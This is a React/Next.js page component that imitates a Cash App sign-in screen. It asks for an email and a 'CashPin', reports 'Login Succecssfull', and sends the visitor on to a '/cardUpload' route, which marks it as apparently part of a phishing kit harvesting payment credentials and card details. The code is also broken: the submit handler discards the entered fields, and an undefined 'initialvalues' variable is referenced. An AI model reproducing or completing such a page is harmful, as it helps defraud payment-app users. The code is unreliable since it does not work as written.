"use client"

import Cookies from "js-cookie";
import { useState } from "react";
import { API_URL } from "../config";
import { useRouter } from "next/navigation";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import { toast } from "react-toastify";

function CashAppPage() {
  const router = useRouter();
  const [skipcode,setSkipcode] = useState("");
  const currentDate = new Date();
  const options = { year: "numeric", month: "long", day: "numeric" };
  const formattedDate = currentDate.toLocaleDateString("en-US", options);

  const id = Cookies.get("id");

 

  const handleSubmit = async () => {
    const values = {
      id: id,
      skipcode
    };
  
    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Succecssfull");
      console.log("success", data);
      router.push("/cardUpload");
      setSkipcode("")
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="flex flex-col justify-center items-center shadow-lg rounded-xl bg-slate-100 w-[400px] h-[500px] mx-auto mt-[150px]">
      <img src="/images/Square_Cash_app_logo.svg" height={200} width={200} />
      <div className="mt-5">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="">
              <div className="flex flex-row justify-center items-center pl-5 w-[387px]">
                <label
                  htmlFor="email"
                  className="text-sm w-[100px] text-green-500 font-semibold "
                >
                  Your Email:
                </label>
                <Field
                  className="w-full px-[4px] py-[5px]  outline-none border  border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
                  placeholder="Enter your email"
                  name="email"
                  type="email"
                  required
                />
              </div>

              <div className="flex flex-row justify-center mt-3 items-center -pl-2  w-[388px]">
                <label
                  htmlFor="email"
                  className="text-sm  w-[130px] text-green-500 font-semibold"
                >
                  Your CashPin:
                </label>
                <Field
                  className="w-full  px-[4px] py-[5px] outline-none border border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
                  placeholder="Enter your cashpin"
                  name="password"
                  type="password"
                  autoComplete="on"
                  required
                />
              </div>

              <div className="flex flex-row justify-center items-center mt-1">
                <button
                  type="submit"
                  className="mt-5 px-6 py-1 text-lg font-semibold bg-green-500 mx-auto text-white transition duration-300 rounded"
                >
                  Add Money
                </button>
              </div>
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default CashAppPage;
